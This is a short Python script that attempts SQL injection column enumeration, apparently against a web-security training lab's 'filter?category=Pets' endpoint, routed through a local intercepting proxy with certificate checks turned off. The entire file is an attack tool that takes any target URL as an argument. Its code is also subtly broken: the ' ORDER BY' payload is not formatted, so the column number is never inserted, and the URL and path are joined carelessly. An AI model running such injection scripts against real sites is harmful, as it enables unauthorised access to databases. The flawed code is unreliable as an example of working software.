import requests
import sys
import urllib3
from urllib3 import exceptions
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def exploit_sqli(url):
    path = 'filter?category=Pets'
    for i in range(1, 50):
        payload = "' ORDER BY {i}--"
        uri = f'{url}{path}{payload}'
        r = requests.get(uri, verify=False, proxies=proxies, timeout=5)
        if "Internal" in r.text:
            return i - 1
    return False



if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: python3 {sys.argv[0]} <url>')
        print(f'[-] Example: python3 {sys.argv[0]} example.com')
        sys.exit(1)

    
    print("[*] Getting the number of columns...")
    num_of_cols = exploit_sqli(url)
    if num_of_cols:
        print(f'[+] SQL Injection Successful and the number of cols: {num_of_cols}')
    else:
        print(f'[-] SQL Injection failed!')
